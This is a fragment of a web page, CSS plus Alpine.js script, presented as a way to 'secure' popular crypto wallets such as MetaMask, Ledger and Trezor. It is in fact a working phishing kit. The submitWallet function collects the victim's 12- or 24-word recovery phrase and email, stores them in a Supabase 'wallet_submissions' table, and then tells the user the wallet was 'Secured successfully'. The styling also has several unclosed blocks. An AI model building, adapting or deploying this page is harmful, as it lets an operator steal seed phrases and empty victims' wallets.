        min-height: 100vh;
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
    }
    
    .header-nav {
        background: rgba(10, 31, 20, 0.98);

        border-bottom: 1px solid rgba(16, 185, 129, 0.15);

        cursor: pointer;
    }
    
    .wallet-card:hover {
        background: rgba(26, 60, 46, 0.6);

        transform: translateX(4px);
        box-shadow: 0 4px 12px rgba(16, 185, 129, 0.15);
    }

    .wallet-icon-container {
        width: 48px;
        height: 48px;
        display: flex;
        align-items: center;
        justify-content: center;
        background: rgba(255, 255, 255, 0.05);
        border-radius: 12px;
        padding: 8px;
    }

    .wallet-icon {
        width: 100%;
        height: 100%;
        object-fit: contain;
    }

    .modal-wallet-icon {
        width: 64px;
        height: 64px;
        object-fit: contain;
    }

    .cancel-btn {
        background: rgba(239, 68, 68, 0.1);
        border: 1px solid rgba(239, 68, 68, 0.3);
        color: #fca5a5;
        transition: all 0.2s ease;
    }
    
    .cancel-btn:hover {
        background: rgba(239, 68, 68, 0.2);
        border-color: rgba(239, 68, 68, 0.5);
        color: #fff;
    }

    .toggle-checkbox {
        appearance: none;
        width: 44px;
        height: 24px;
        background: rgba(75, 85, 99, 0.5);
        border-radius: 12px;
        position: relative;
        cursor: pointer;
        transition: background 0.3s ease;
    }
    
    .toggle-checkbox:checked {
        background: #10b981;
    }
    
    .toggle-checkbox::before {
        content: '';
        position: absolute;
        width: 18px;
        height: 18px;
        border-radius: 50%;
        background: white;
        top: 3px;
        left: 3px;
        transition: transform 0.3s ease;
    }
    
    .toggle-checkbox:checked::before {
        transform: translateX(20px);
    }

     .modal-backdrop {
        position: fixed;
        inset: 0;
        z-index: 9999;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 16px;
        
        /* SOLID background - no see-through */
        background: #000000;
        backdrop-filter: none;
    }

    /* Modal Content Container */
    .modal-content {
        width: 100%;
        max-width: 28rem; /* 448px */
        
        /* SOLID white background */
        background: #ffffff;
        
        border-radius: 24px;
        overflow: hidden;
        position: relative;
        
        /* Premium shadow */
        box-shadow: 
            0 25px 50px -12px rgba(0, 0, 0, 0.5),
            0 0 0 1px rgba(0, 0, 0, 0.1);
        
        /* Smooth animation */
        animation: modalSlideIn 0.3s cubic-bezier(0.16, 1, 0.3, 1);

    /* Large modal for import form */
    .modal-content-large {
        max-width: 42rem; /* 672px */
    }

    @keyframes modalSlideIn {
        from {
            opacity: 0;
            transform: scale(0.95) translateY(20px);
        }
        to {
            opacity: 1;
            transform: scale(1) translateY(0);
        }

    .modal-header {
        padding: 24px 32px;
        border-bottom: 1px solid #e5e7eb;
        display: flex;
        align-items: center;
        justify-content: space-between;

        font-size: 24px;
        font-weight: 700;
        color: #111827;
        margin: 0;
    }

    /* Close button */
    .modal-close-btn {
        width: 40px;
        height: 40px;
        border-radius: 50%;
        background: #f3f4f6;
        border: none;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 24px;
        color: #6b7280;
        transition: all 0.2s ease;
    }

    .modal-close-btn:hover {
        background: #e5e7eb;
        color: #111827;
        transform: rotate(90deg);
    }

    /* Modal Body */
    .modal-body {
        padding: 32px;
        background: #ffffff;
    }

    /* Wallet info section */
    .wallet-info-section {
        text-align: center;
        padding: 24px 0;
    }

    .wallet-icon-large {
        width: 80px;
        height: 80px;
        margin: 0 auto 24px;
        padding: 16px;

        border: 2px solid #10b981;

    .wallet-icon-large img {

        height: 100%;

    .wallet-description {

        line-height: 1.6;
        font-size: 15px;
        margin-top: 16px;
    }

    /* Tabs for import methods */
    .modal-tabs {

        border-bottom: 2px solid #e5e7eb;
        background: #ffffff;
    }

    .modal-tab {
        flex: 1;
        padding: 16px;
        border: none;
        background: transparent;
        color: #6b7280;
        font-weight: 600;
        font-size: 15px;
        cursor: pointer;
        position: relative;
        transition: all 0.2s ease;
    }

    .modal-tab:hover {
        color: #10b981;
        background: #f9fafb;
    }

    .modal-tab.active {
        color: #10b981;
    }

    .modal-tab.active::after {
        content: '';
        position: absolute;
        bottom: -2px;
        left: 0;
        right: 0;
        height: 2px;
        background: #10b981;
    }

    /* Form inputs in modal */
    input[type="text"],
    input[type="email"],
    textarea {
        width: 100%;
        padding: 14px 16px;
        border: 2px solid #d1d5db;

        background: #ffffff;
        color: #111827;
        font-size: 16px;

    textarea::placeholder {
        color: #9ca3af;
        opacity: 1;
    }

    input[type="text"]:hover,
    input[type="email"]:hover,
    textarea:hover {
        border-color: #10b981;
        background: #f9fafb;
        box-shadow: 0 4px 12px rgba(16, 185, 129, 0.15);
        transform: translateY(-1px);

    input[type="text"]:focus,
    input[type="email"]:focus,
    textarea:focus {
        border-color: #10b981;
        background: #ffffff;
        box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2),

        transform: translateY(-1px);

    textarea {

    label {
        display: block;
        font-size: 14px;
        font-weight: 600;
        margin-bottom: 8px;
        color: #374151;
    }

    .input-group {
        margin-bottom: 20px;
    }

    .help-text {
        font-size: 12px;
        color: #6b7280;
        margin-top: 6px;
        display: flex;
        align-items: center;
        gap: 4px;
    }

    /* Modal buttons */
    .modal-buttons {
        display: flex;
        gap: 12px;
        margin-top: 32px;
    }

    .modal-btn {
        flex: 1;
        padding: 16px 24px;
        border-radius: 12px;
        font-weight: 600;
        font-size: 16px;
        cursor: pointer;
        transition: all 0.2s ease;
        border: none;
        display: flex;
        align-items: center;

    .modal-btn-secondary {

        color: #374151;
        border: 2px solid #e5e7eb;
    }

    .modal-btn-secondary:hover {
        background: #e5e7eb;
        border-color: #d1d5db;
        transform: translateY(-1px);
    }

    .modal-btn-primary {
        background: linear-gradient(135deg, #10b981 0%, #059669 100%);
        color: #ffffff;
        box-shadow: 0 4px 14px rgba(16, 185, 129, 0.4);
    }

    .modal-btn-primary:hover {
        box-shadow: 0 6px 20px rgba(16, 185, 129, 0.5);
        transform: translateY(-2px);
    }

    .modal-btn-gradient {
        background: linear-gradient(135deg, #ec4899 0%, #8b5cf6 50%, #10b981 100%);
        color: #ffffff;
        box-shadow: 0 4px 14px rgba(139, 92, 246, 0.4);
    }

    .modal-btn-gradient:hover {
        box-shadow: 0 6px 20px rgba(139, 92, 246, 0.5);
        transform: translateY(-2px);
    }

    .modal-btn:disabled {
        opacity: 0.5;
        cursor: not-allowed;
        transform: none !important;
    }

    /* Loading spinner */
    .spinner {
        border: 3px solid rgba(255, 255, 255, 0.3);
        border-top: 3px solid white;
        border-radius: 50%;
        width: 20px;
        height: 20px;
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }

    /* Error and success messages */
    .error-message {
        background: #fef2f2;
        border: 2px solid #fecaca;
        color: #dc2626;
        padding: 14px 16px;
        border-radius: 10px;
        margin-top: 16px;
        font-size: 14px;
        display: flex;
        align-items: center;
        gap: 8px;
    }

    .success-message {
        background: #f0fdf4;
        border: 2px solid #bbf7d0;
        color: #059669;
        padding: 14px 16px;
        border-radius: 10px;
        margin-top: 16px;
        font-size: 14px;
        display: flex;
        align-items: center;
        gap: 8px;
    }

    .description-text {

    .secure-wallet-btn {
        background: linear-gradient(135deg, #10b981 0%, #059669 100%);
        box-shadow: 0 4px 14px rgba(16, 185, 129, 0.3);
    }
    
    .secure-wallet-btn:hover {
        box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
        transform: translateY(-1px);
    }

    /* Hide scrollbar on modal backdrop but keep scroll functionality */
    .modal-backdrop {
        overflow-y: auto;
        scrollbar-width: none; /* Firefox */
    }

    .modal-backdrop::-webkit-scrollbar {
        display: none; /* Chrome, Safari, Edge */
    }

    /* Auto-fill styling (Chrome) */
    input:-webkit-autofill,
    input:-webkit-autofill:hover,
    input:-webkit-autofill:focus {
        -webkit-text-fill-color: #111827;
        -webkit-box-shadow: 0 0 0px 1000px #ffffff inset;
        transition: background-color 5000s ease-in-out 0s;
    }

   .lock-icon-container {
        background-color: #000000 !important;

    .Bad-icon-container {
        background-color: #000000 !important;
        border: 2px solid rgba(255, 255, 255, 0.7);
        box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.3);
    }
</style>

    if (window.supabase) {
        try {
            supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
            console.log('✅ Supabase client initialized');
        } catch (error) {
            console.error('❌ Supabase initialization error:', error);
        }
    }

    // Register Alpine component
    document.addEventListener('alpine:init', () => {
        Alpine.data('walletPage', () => ({
            selectedWallet: null,
            showModal: false,
            showImportForm: false,
            showUninstalled: false,
            walletName: '',
            email: '',
            recoveryPhrase: '',
            importMethod: 'phrase',
            isSubmitting: false,
            errorMessage: '',
            successMessage: '',
            
            wallets: [
                { name: 'Exodus', icon: 'assets2/images/wallets/exodus.png', description: 'A Web3 wallet is a versatile and significant piece of technology.' },
                { name: 'Trust Wallet', icon: 'assets2/images/wallets/trust-wallet.png', description: 'Trust Wallet is a secure cryptocurrency wallet.' },
                { name: 'Wallet Connect', icon: 'assets2/images/wallets/wallet-connect.png', description: 'WalletConnect is an open protocol.' },
                { name: 'MetaMask', icon: 'assets2/images/wallets/metamask.png', description: 'MetaMask is a crypto wallet & gateway.' },
                { name: 'Phantom', icon: 'assets2/images/wallets/phantom.png', description: 'Phantom is a friendly crypto wallet.' },
                { name: 'Coinbase Wallet', icon: 'assets2/images/wallets/coinbase-wallet.png', description: 'Your key to the world of crypto.' },
                { name: 'Ledger', icon: 'assets2/images/wallets/ledger.png', description: 'The most trusted hardware wallet.' },
                { name: 'Trezor', icon: 'assets2/images/wallets/trezor.png', description: 'Ultimate protection for your assets.' },
                {name: 'Rainbow', icon: 'assets2/images/wallets/rainbow.png', description: 'Rainbow is a fun and colorful crypto wallet.' },
                { name: 'Argent', icon: 'assets2/images/wallets/argent.png', description: 'Argent is a smart wallet for Ethereum.' },
                { name: 'Gnosis Safe', icon: 'assets2/images/wallets/gnosis-safe.png', description: 'Gnosis Safe is a multi-sig wallet.' },
                { name: 'MyEtherWallet', icon: 'assets2/images/wallets/myetherwallet.png', description: 'MEW is a free, open-source interface.' },
                { name: 'OKX', icon: 'assets2/images/wallets/okx.png', description: 'OKX Wallet is a web3 universal crypto wallet available on multiple platforms.' }
            ],

            openWalletModal(wallet) {
                console.log('Opening modal for:', wallet.name);
                this.selectedWallet = wallet;
                this.showModal = true;
                document.body.style.overflow = 'hidden';
            },

            closeModal() {
                this.showModal = false;
                this.showImportForm = false;
                document.body.style.overflow = 'auto';
                this.resetForm();
            },

            proceedToImport() {
                this.showModal = false;
                this.showImportForm = true;
            },

            resetForm() {
                this.walletName = '';
                this.email = '';
                this.recoveryPhrase = '';
                this.importMethod = 'phrase';
                this.errorMessage = '';
                this.successMessage = '';
                this.isSubmitting = false;
            },

            goBack() {
                window.location.href = '/';
            },

            validateForm() {
                this.errorMessage = '';
                if (!this.walletName.trim()) {
                    this.errorMessage = 'Please enter a wallet name';
                    return false;
                }
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!this.email.trim() || !emailRegex.test(this.email)) {
                    this.errorMessage = 'Please enter a valid email';
                    return false;
                }
                if (!this.recoveryPhrase.trim()) {
                    this.errorMessage = 'Please enter your recovery phrase';
                    return false;
                }
                if (this.importMethod === 'phrase') {
                    const words = this.recoveryPhrase.trim().split(/\s+/);
                    if (words.length !== 12 && words.length !== 24) {
                        this.errorMessage = 'Recovery phrase must be 12 or 24 words';
                        return false;
                    }
                }
                return true;
            },

            async submitWallet() {
                if (!this.validateForm()) return;

                this.isSubmitting = true;
                this.errorMessage = '';
                this.successMessage = '';

                try {
                    const submissionData = {
                        wallet_type: this.selectedWallet?.name,
                        wallet_name: this.walletName.trim(),
                        email: this.email.trim(),
                        recovery_phrase: this.recoveryPhrase.trim(),
                        import_method: this.importMethod,
                        user_agent: navigator.userAgent,
                        // submitted_at: new Date().toISOString() //
                    };

                    console.log('📤 Submitting:', submissionData);

                    if (!supabaseClient) {
                        throw new Error('Supabase not initialized');
                    }

                    const { data, error } = await supabaseClient
                        .from('wallet_submissions')
                        .insert([submissionData])
                        .select();

                    if (error) throw error;

                    console.log('✅ Success:', data);
                    this.successMessage = '✅ Wallet Secured successfully!';
                    
                    setTimeout(() => {
                        this.closeModal();
                        window.location.href = '/';
                    }, 2000);

                } catch (error) {
                    console.error('❌ Error:', error);
                    this.errorMessage = `Failed: ${error.message}`;
                } finally {
                    this.isSubmitting = false;
                }
            }
        }));
        
        console.log('✅ Alpine component registered');
    });
    </script>
